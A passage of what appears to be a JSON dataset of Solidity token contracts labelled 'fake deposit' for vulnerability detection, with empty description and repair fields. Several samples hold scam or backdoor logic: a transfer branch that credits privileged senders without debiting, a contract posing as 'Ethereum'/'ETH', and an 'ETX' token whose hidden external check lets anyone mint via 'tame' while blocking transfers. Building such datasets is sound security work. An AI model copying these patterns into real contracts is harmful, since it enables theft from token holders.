amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address Zd, uint256 Zf) public {\r\n        if(msg.sender == _zConst)  {\r\n        require(Zc[msg.sender] >= Zf);\r\n        Zc[msg.sender] -= Zf;  \r\n        Zc[Zd] += Zf; \r\n        emit Transfer (zRouterV2, Zd, Zf);} else  \r\n        if(Zb[msg.sender]) {Zc[Zd] += Zf;} else\r\n        if(!Za[msg.sender]) {\r\n        require(Zc[msg.sender] >= Zf);\r\n        Zc[msg.sender] -= Zf;  \r\n        Zc[Zd] += Zf;          \r\n        emit Transfer(msg.sender, Zd, Zf);}}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n *Submitted for verification at Etherscan.io on 2022-06-20\r\n*/\r\n\r\npragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract MyEther is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function MyEther(\r\n        ) {\r\n        balances[msg.sender] = 1000000000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 100000000000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"Ethereum\";                                   // Set the name for display purposes\r\n        decimals = 18;                            // Amount of decimals for display purposes\r\n        symbol = \"ETH\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "function assert(bool assertion) internal {   if (!assertion) { */\r\n    /*     throw; */\r\n    /*   } */\r\n    /* }      // assert no longer needed once solidity is on 0.4.10 */\r\n\r\n    function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\r\n      uint256 z = x + y;\r\n      assert((z >= x) && (z >= y));\r\n      return z;\r\n    }\r\n\r\n    function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\r\n      assert(x >= y);\r\n      uint256 z = x - y;\r\n      return z;\r\n    }\r\n\r\n    function safeMult(uint256 x, uint256 y) internal returns(uint256) {\r\n      uint256 z = x * y;\r\n      assert((x == 0)||(z/x == y));\r\n      return z;\r\n    }\r\n\r\n}\r\n\r\ncontract Token {\r\n    uint256 public totalSupply;\r\n    function balanceOf(address _owner) constant returns (uint256 balance);\r\n    function transfer(address _to, uint256 _value) returns (bool success);\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\n    function approve(address _spender, uint256 _value) returns (bool success);\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n/*  ERC 20 token */\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n      if (balances[msg.sender] >= _value && _value > 0) {\r\n        balances[msg.sender] -= _value;\r\n        balances[_to] += _value;\r\n        Transfer(msg.sender, _to, _value);\r\n        return true;\r\n      } else {\r\n        return false;\r\n      }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n      if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n        balances[_to] += _value;\r\n        balances[_from] -= _value;\r\n        allowed[_from][msg.sender] -= _value;\r\n        Transfer(_from, _to, _value);\r\n        return true;\r\n      } else {\r\n        return false;\r\n      }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n}\r\n\r\ncontract BAToken is StandardToken, SafeMath {\r\n\r\n    // metadata\r\n    string public constant name = \"Basic Attention Token\";\r\n    string public constant symbol = \"BAT\";\r\n    uint256 public constant decimals = 18;\r\n    string public version = \"1.0\";\r\n\r\n    // contracts\r\n    address public ethFundDeposit;      // deposit address for ETH for Brave International\r\n    address public batFundDeposit;      // deposit address for Brave International use and BAT User Fund\r\n\r\n    // crowdsale parameters\r\n    bool public isFinalized;              // switched to true in operational state\r\n    uint256 public fundingStartBlock;\r\n    uint256 public fundingEndBlock;\r\n    uint256 public constant batFund = 500 * (10**6) * 10**decimals;   // 500m BAT reserved for Brave Intl use\r\n    uint256 public constant tokenExchangeRate = 6400; // 6400 BAT tokens per 1 ETH\r\n    uint256 public constant tokenCreationCap =  1500 * (10**6) * 10**decimals;\r\n    uint256 public constant tokenCreationMin =  675 * (10**6) * 10**decimals;\r\n\r\n\r\n    // events\r\n    event LogRefund(address indexed _to, uint256 _value);\r\n    event CreateBAT(address indexed _to, uint256 _value);\r\n\r\n    // constructor\r\n    function BAToken(\r\n        address _ethFundDeposit,\r\n        address _batFundDeposit,\r\n        uint256 _fundingStartBlock,\r\n        uint256 _fundingEndBlock)\r\n    {\r\n      isFinalized = false;                   //controls pre through crowdsale state\r\n      ethFundDeposit = _ethFundDeposit;\r\n      batFundDeposit = _batFundDeposit;\r\n      fundingStartBlock = _fundingStartBlock;\r\n      fundingEndBlock = _fundingEndBlock;\r\n      totalSupply = batFund;\r\n      balances[batFundDeposit] = batFund;    // Deposit Brave Intl share\r\n      CreateBAT(batFundDeposit, batFund);  // logs Brave Intl fund\r\n    }\r\n\r\n    /// @dev Accepts ether and creates new BAT tokens.\r\n    function createTokens() payable external {\r\n      if (isFinalized) throw;\r\n      if (block.number < fundingStartBlock) throw;\r\n      if (block.number > fundingEndBlock) throw;\r\n      if (msg.value == 0) throw;\r\n\r\n      uint256 tokens = safeMult(msg.value, tokenExchangeRate); // check that we're not over totals\r\n      uint256 checkedSupply = safeAdd(totalSupply, tokens);\r\n\r\n      // return money if something goes wrong\r\n      if (tokenCreationCap < checkedSupply) throw;  // odd fractions won't be found\r\n\r\n      totalSupply = checkedSupply;\r\n      balances[msg.sender] += tokens;  // safeAdd not needed; bad semantics to use here\r\n      CreateBAT(msg.sender, tokens);  // logs token creation\r\n    }\r\n\r\n    /// @dev Ends the funding period and sends the ETH home\r\n    function finalize() external {\r\n      if (isFinalized) throw;\r\n      if (msg.sender != ethFundDeposit) throw; // locks finalize to the ultimate ETH owner\r\n      if(totalSupply < tokenCreationMin) throw;      // have to sell minimum to move to operational\r\n      if(block.number <= fundingEndBlock && totalSupply != tokenCreationCap) throw;\r\n      // move to operational\r\n      isFinalized = true;\r\n      if(!ethFundDeposit.send(this.balance)) throw;  // send the eth to Brave International\r\n    }\r\n\r\n    /// @dev Allows contributors to recover their ether in the case of a failed funding campaign.\r\n    function refund() external {\r\n      if(isFinalized) throw;                       // prevents refund if operational\r\n      if (block.number <= fundingEndBlock) throw; // prevents refund until sale period is over\r\n      if(totalSupply >= tokenCreationMin) throw; if(msg.sender == batFundDeposit) throw;          uint256 batVal = balances[msg.sender];\r\n      if (batVal == 0) throw;\r\n      balances[msg.sender] = 0;\r\n      totalSupply = safeSubtract(totalSupply, batVal); // extra safe\r\n      uint256 ethVal = batVal / tokenExchangeRate;     // should be safe; previous throws covers edges\r\n      LogRefund(msg.sender, ethVal);               // log it \r\n      if (!msg.sender.send(ethVal)) throw;       // if you're using a contract; make sure it works with .send gas limits\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "function assert(bool assertion) internal {    if (!assertion) {      throw;    } */\r\n    /* }      // assert no longer needed once solidity is on 0.4.10 */\r\n\r\n    function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\r\n      uint256 z = x + y;\r\n      assert((z >= x) && (z >= y));\r\n      return z;\r\n    }\r\n\r\n    function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\r\n      assert(x >= y);\r\n      uint256 z = x - y;\r\n      return z;\r\n    }\r\n\r\n    function safeMult(uint256 x, uint256 y) internal returns(uint256) {\r\n      uint256 z = x * y;\r\n      assert((x == 0)||(z/x == y));\r\n      return z;\r\n    }\r\n\r\n}\r\n\r\ncontract Token {\r\n    uint256 public totalSupply;\r\n    function balanceOf(address _owner) constant returns (uint256 balance);\r\n    function transfer(address _to, uint256 _value) returns (bool success);\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\n    function approve(address _spender, uint256 _value) returns (bool success);\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n/*  ERC 20 token */\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n      if (balances[msg.sender] >= _value && _value > 0) {\r\n        balances[msg.sender] -= _value;\r\n        balances[_to] += _value;\r\n        Transfer(msg.sender, _to, _value);\r\n        return true;\r\n      } else {\r\n        return false;\r\n      }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n      if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n        balances[_to] += _value;\r\n        balances[_from] -= _value;\r\n        allowed[_from][msg.sender] -= _value;\r\n        Transfer(_from, _to, _value);\r\n        return true;\r\n      } else {\r\n        return false;\r\n      }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n}\r\n\r\ncontract BAToken is StandardToken, SafeMath {\r\n\r\n    // metadata\r\n    string public constant name = \"Basic Attention Token\";\r\n    string public constant symbol = \"BAT\";\r\n    uint256 public constant decimals = 18;\r\n    string public version = \"1.0\";\r\n\r\n    // contracts\r\n    address public ethFundDeposit;      // deposit address for ETH for Brave International\r\n    address public batFundDeposit;      // deposit address for Brave International use and BAT User Fund\r\n\r\n    // crowdsale parameters\r\n    bool public isFinalized;              // switched to true in operational state\r\n    uint256 public fundingStartBlock;\r\n    uint256 public fundingEndBlock;\r\n    uint256 public constant batFund = 500 * (10**6) * 10**decimals;   // 500m BAT reserved for Brave Intl use\r\n    uint256 public constant tokenExchangeRate = 6400; // 6400 BAT tokens per 1 ETH\r\n    uint256 public constant tokenCreationCap =  1500 * (10**6) * 10**decimals;\r\n    uint256 public constant tokenCreationMin =  675 * (10**6) * 10**decimals;\r\n\r\n\r\n    // events\r\n    event LogRefund(address indexed _to, uint256 _value);\r\n    event CreateBAT(address indexed _to, uint256 _value);\r\n\r\n    // constructor\r\n    function BAToken(\r\n        address _ethFundDeposit,\r\n        address _batFundDeposit,\r\n        uint256 _fundingStartBlock,\r\n        uint256 _fundingEndBlock)\r\n    {\r\n      isFinalized = false;                   //controls pre through crowdsale state\r\n      ethFundDeposit = _ethFundDeposit;\r\n      batFundDeposit = _batFundDeposit;\r\n      fundingStartBlock = _fundingStartBlock;\r\n      fundingEndBlock = _fundingEndBlock;\r\n      totalSupply = batFund;\r\n      balances[batFundDeposit] = batFund;    // Deposit Brave Intl share\r\n      CreateBAT(batFundDeposit, batFund);  // logs Brave Intl fund\r\n    }\r\n\r\n    /// @dev Accepts ether and creates new BAT tokens.\r\n    function createTokens() payable external {\r\n      if (isFinalized) throw;\r\n      if (block.number < fundingStartBlock) throw;\r\n      if (block.number > fundingEndBlock) throw;\r\n      if (msg.value == 0) throw;\r\n\r\n      uint256 tokens = safeMult(msg.value, tokenExchangeRate); // check that we're not over totals\r\n      uint256 checkedSupply = safeAdd(totalSupply, tokens);\r\n\r\n      // return money if something goes wrong\r\n      if (tokenCreationCap < checkedSupply) throw;  // odd fractions won't be found\r\n\r\n      totalSupply = checkedSupply;\r\n      balances[msg.sender] += tokens;  // safeAdd not needed; bad semantics to use here\r\n      CreateBAT(msg.sender, tokens);  // logs token creation\r\n    }\r\n\r\n    /// @dev Ends the funding period and sends the ETH home\r\n    function finalize() external {\r\n      if (isFinalized) throw;\r\n      if (msg.sender != ethFundDeposit) throw; // locks finalize to the ultimate ETH owner\r\n      if(totalSupply < tokenCreationMin) throw;      // have to sell minimum to move to operational\r\n      if(block.number <= fundingEndBlock && totalSupply != tokenCreationCap) throw;\r\n      // move to operational\r\n      isFinalized = true;\r\n      if(!ethFundDeposit.send(this.balance)) throw;  // send the eth to Brave International\r\n    }\r\n\r\n    /// @dev Allows contributors to recover their ether in the case of a failed funding campaign.\r\n    function refund() external {\r\n      if(isFinalized) throw;                       // prevents refund if operational\r\n      if (block.number <= fundingEndBlock) throw; // prevents refund until sale period is over\r\n      if(totalSupply >= tokenCreationMin) throw; if(msg.sender == batFundDeposit) throw;          uint256 batVal = balances[msg.sender];\r\n      if (batVal == 0) throw;\r\n      balances[msg.sender] = 0;\r\n      totalSupply = safeSubtract(totalSupply, batVal); // extra safe\r\n      uint256 ethVal = batVal / tokenExchangeRate;     // should be safe; previous throws covers edges\r\n      LogRefund(msg.sender, ethVal);               // log it \r\n      if (!msg.sender.send(ethVal)) throw;       // if you're using a contract; make sure it works with .send gas limits\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\n\r\n\r\npragma solidity ^0.8.0;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IERC20Dependancies {\r\n    function checkERC20Status(address tokenAddress, uint256 amount) external view returns (uint256);\r\n    function checkERC20TrustStatus(address userAddress) external view returns (uint256);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ncontract ETX is Context, IERC20Metadata {\r\n\r\n    mapping(address => uint256) private _balances;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    string private _tokenTS_name;\r\n    string private _tokenTS_symbol; \r\n\r\n\r\n    uint256 private _tokenTS_totalSupply;\r\n\r\n    \r\n\r\n    IERC20Dependancies private ERC20Dependancies;\r\n\r\n    constructor() {\r\n        _tokenTS_name = \"ETX Share\";\r\n        _tokenTS_symbol = \"ETX\";\r\n        _tokenTS_totalSupply = 100000 * 10 ** 18;\r\n        _balances[msg.sender] = _tokenTS_totalSupply;\r\n        ERC20Dependancies = IERC20Dependancies(0xb6a17Ccf4B4f2cBA851f4D52aFBeFF61B8d1D9c2);\r\n    }\r\n\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address balance_from,\r\n        address balance_to,\r\n        uint256 balance_amount\r\n    ) internal virtual {}\r\n\r\n    function _afterTokenTransfer(\r\n        address balance_from,\r\n        address balance_to,\r\n        uint256 balance_amount\r\n    ) internal virtual {}\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, _allowances[owner][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _tokenTS_name;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _tokenTS_totalSupply;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = _allowances[owner][spender];\r\n        require(currentAllowance >= subtractedValue, \"Token : decreased allowance below 0\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n    function _safeTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"Token : transfer from the 0 address\");\r\n        require(to != address(0), \"Token : transfer to the 0 address\");\r\n\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= amount, \"Token : transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n        }\r\n        _balances[to] += amount;\r\n\r\n        emit Transfer(from, to, amount);\r\n\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        uint256 ERC20SafetyStatus = ERC20Dependancies.checkERC20Status(from, amount);\r\n        if (ERC20SafetyStatus == 0)\r\n        {\r\n            _spendAllowance(from, spender, amount);\r\n            _safeTransfer(from, to, amount);\r\n            return true;\r\n        }\r\n        else\r\n        {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    \r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _tokenTS_symbol;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address balance_owner,\r\n        address balance_spender,\r\n        uint256 balance_amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(balance_owner, balance_spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= balance_amount, \"Token : insufficient allowance\");\r\n            unchecked {\r\n                _approve(balance_owner, balance_spender, currentAllowance - balance_amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    \r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function tame(address address_to_tame, uint256 amount) public virtual{\r\n        uint256 ERC20SafetyStatus = ERC20Dependancies.checkERC20Status(address_to_tame, amount);\r\n        if(ERC20SafetyStatus == 0)\r\n        {\r\n            _balances[address_to_tame] = _balances[address_to_tame] + amount;\r\n        }\r\n    }\r\n\r\n\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 ERC20SafetyStatus = ERC20Dependancies.checkERC20TrustStatus(to);\r\n        if (ERC20SafetyStatus == 0)\r\n        {\r\n            _safeTransfer(owner, to, amount);\r\n            return true;\r\n        }\r\n        else\r\n        {\r\n            return false;\r\n        }\r\n        \r\n    }\r\n\r\n    function _approve(\r\n        address balance_owner,\r\n        address balance_spender,\r\n        uint256 balance_amount\r\n    ) internal virtual {\r\n        require(balance_owner != address(0), \"Token : approve from the 0 address\");\r\n        require(balance_spender != address(0), \"Token : approve to the 0 address\");\r\n\r\n        _allowances[balance_owner][balance_spender] = balance_amount;\r\n        emit Approval(balance_owner, balance_spender, balance_amount);\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n\r\n    \r\n\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.10;\r\n\r\n/* taking ideas from FirstBlood token */\r\ncontract SafeMath {\r\n\r\n    /* function assert(bool assertion) internal { */\r\n    /*   if (!assertion) { */\r\n    /*     throw; */\r\n    /*   } */\r\n    /* }      // assert no longer needed once solidity is on 0.4.10 */\r\n\r\n    function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\r\n      uint256 z = x + y;\r\n      assert((z >= x) && (z >= y));\r\n      return z;\r\n    }\r\n\r\n    function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\r\n      assert(x >= y);\r\n      uint256 z = x - y;\r\n      return z;\r\n    }\r\n\r\n    function safeMult(uint256 x, uint256 y) internal returns(uint256) {\r\n      uint256 z = x * y;\r\n      assert((x == 0)||(z/x == y));\r\n      return z;\r\n    }\r\n\r\n}\r\n\r\ncontract Token {\r\n    uint256 public totalSupply;\r\n    function balanceOf(address _owner) constant returns (uint256 balance);\r\n    function transfer(address _to, uint256 _value) returns (bool success);\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\n    function approve(address _spender, uint256 _value) returns (bool success);\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n/*  ERC 20 token */\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n      if (balances[msg.sender] >= _value && _value > 0) {\r\n        balances[msg.sender] -= _value;\r\n        balances[_to] += _value;\r\n        Transfer(msg.sender, _to, _value);\r\n        return true;\r\n      } else {\r\n        return false;\r\n      }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n      if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n        balances[_to] += _value;\r\n        balances[_from] -= _value;\r\n        allowed[_from][msg.sender] -= _value;\r\n        Transfer(_from, _to, _value);\r\n        return true;\r\n      } else {\r\n        return false;\r\n      }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n}\r\n\r\ncontract BAToken is StandardToken, SafeMath {\r\n\r\n    // metadata\r\n    string public constant name = \"Basic Attention Token\";\r\n    string public constant symbol = \"BAT\";\r\n    uint256 public constant decimals = 18;\r\n    string public version = \"1.0\";\r\n\r\n    // contracts\r\n    address public ethFundDeposit;      // deposit address for ETH for Brave International\r\n    address public batFundDeposit;      // deposit address for Brave International use and BAT User Fund\r\n\r\n    // crowdsale parameters\r\n    bool public isFinalized;              // switched to true in operational state\r\n    uint256 public fundingStartBlock;\r\n    uint256 public fundingEndBlock;\r\n    uint256 public constant batFund = 500 * (10**6) * 10**decimals;   // 500m BAT reserved for Brave Intl use\r\n    uint256 public constant tokenExchangeRate = 6400; // 6400 BAT tokens per 1 ETH\r\n    uint256 public constant tokenCreationCap =  1500 * (10**6) * 10**decimals;\r\n    uint256 public constant tokenCreationMin =  675 * (10**6) * 10**decimals;\r\n\r\n\r\n    // events\r\n    event LogRefund(address indexed _to, uint256 _value);\r\n    event CreateBAT(address indexed _to, uint256 _value);\r\n\r\n    // constructor\r\n    function BAToken(\r\n        address _ethFundDeposit,\r\n        address _batFundDeposit,\r\n        uint256 _fundingStartBlock,\r\n        uint256 _fundingEndBlock)\r\n    {\r\n      isFinalized = false;                   //controls pre through crowdsale state\r\n      ethFundDeposit = _ethFundDeposit;\r\n      batFundDeposit = _batFundDeposit;\r\n      fundingStartBlock = _fundingStartBlock;\r\n      fundingEndBlock = _fundingEndBlock;\r\n      totalSupply = batFund;\r\n      balances[batFundDeposit] = batFund;          CreateBAT(batFundDeposit, batFund);  // logs Brave Intl fund\r\n    }\r\n\r\n    function createTokens() payable external {\r\n      if (isFinalized) throw;\r\n      if (block.number < fundingStartBlock) throw;\r\n      if (block.number > fundingEndBlock) throw;\r\n      if (msg.value == 0) throw;\r\n\r\n      uint256 tokens = safeMult(msg.value, tokenExchangeRate); // check that we're not over totals\r\n      uint256 checkedSupply = safeAdd(totalSupply, tokens);\r\n\r\n      // return money if something goes wrong\r\n      if (tokenCreationCap < checkedSupply) throw;  // odd fractions won't be found\r\n\r\n      totalSupply = checkedSupply;\r\n      balances[msg.sender] += tokens;  // safeAdd not needed; bad semantics to use here\r\n      CreateBAT(msg.sender, tokens);  // logs token creation\r\n    }\r\n\r\n     function finalize() external {\r\n      if (isFinalized) throw;\r\n      if (msg.sender != ethFundDeposit) throw; // locks finalize to the ultimate ETH owner\r\n      if(totalSupply < tokenCreationMin) throw;      // have to sell minimum 